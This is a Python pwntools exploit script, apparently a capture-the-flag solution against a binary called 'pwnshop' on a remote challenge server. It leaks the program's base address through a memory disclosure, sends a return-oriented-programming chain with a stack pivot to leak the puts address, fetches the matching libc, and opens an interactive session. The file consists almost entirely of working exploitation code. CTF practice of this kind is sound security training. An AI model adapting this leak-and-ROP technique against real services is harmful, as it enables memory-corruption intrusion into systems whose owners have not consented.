#!/usr/bin/env python


from pwn import *
from pwnc.pwnc import get_libc

BINARY = "./pwnshop"
ADDR = "138.68.148.149"
PORT = 30975

splash()
elf = context.binary = ELF(BINARY)


class Offsets:
    fake_frame_offset = 0x40C0
    buy_offset = 0x132A


class Gadgets:
    sub_rsp_0x28_ret = 0x1219
    pop_rdi_ret = 0x13C3


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)

    else:
        return remote(ADDR, PORT)


def solve():
    io = conn()

    io.sendlineafter("> ", "2")
    io.sendlineafter("What do you wish to sell? ", "")
    io.sendlineafter("How much do you want for it? ", cyclic(0x7, n=8))
    io.recvuntil("? ")
    elf_leak = io.recvuntil("?")[:-1]
    elf_leak = u64(elf_leak[8:].ljust(8, b"\x00"))
    elf.address = elf_leak - Offsets.fake_frame_offset
    log.success(f"elf base address found: {hex(elf.address)}")
    log.success(f"fake frame found @: {hex(elf_leak)}")

    payload = [
        cyclic(40, n=8),
        elf.address + Gadgets.pop_rdi_ret,
        elf.got.puts,
        elf.plt.puts,
        elf.address + Offsets.buy_offset,
        elf.address + Gadgets.sub_rsp_0x28_ret,
    ]
    io.sendlineafter("> ", "1")
    io.sendafter("Enter details: ", flat(payload))
    puts_leak = io.recvuntil("\n")[:-1]
    puts_leak = u64(puts_leak.ljust(8, b"\x00"))
    log.success(f"puts@got found @: {hex(puts_leak)}")

    known_syms = {"puts": hex(puts_leak)}
    libc = get_libc(known_syms)

    with open("./libc.so.6", "wb") as libc_file:
        libc_file.write(libc)

    io.interactive()


if __name__ == "__main__":
    solve()
